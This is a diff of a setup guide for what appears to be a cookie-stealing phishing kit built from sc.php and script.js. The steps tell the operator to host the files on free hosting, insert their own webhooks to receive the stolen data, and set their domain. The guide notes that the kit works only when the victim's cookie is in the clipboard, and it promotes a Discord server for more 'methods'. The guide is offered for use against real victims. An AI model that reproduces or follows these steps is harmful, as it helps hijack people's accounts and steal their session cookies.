@@ -1,8 +1,8 @@
-1.) Upload the files to a site (Upload sc.php to a seperate replit/ domain)hoster I recommend using a replit nix web server for small beams(https://replit.com/new/) Or just use https://000webhost.com
+1.) Upload the files to a site hoster I recommend using a replit nix web server for small beams(https://replit.com/new/) Or just use https://000webhost.com
 
 2.)Change the webhooks in sc.php to yours
 
-3.)Go into script.js and replace the Domain to your secondary domain (If you want use a subdomain so you don't have to buy 2 different domains or just use your site hosters free domains)
+3.)Go into script.js and replace the Domain to your domain
 
 4.)Go in sc.php on the other replit and add your webhook then your main domain
 
@@ -14,7 +14,7 @@
 
 6.)Won't work if cookie isn't in clipboard
 
-7.)Join https://discord.gg/sUPRXSYMKg for more epic methods
+7.)Join https://discord.gg/legal for more epic methods
 
 8.)I wanted to make this somewhat easy to edit so the template it super basic. Do't be a skid and please make your own template
 
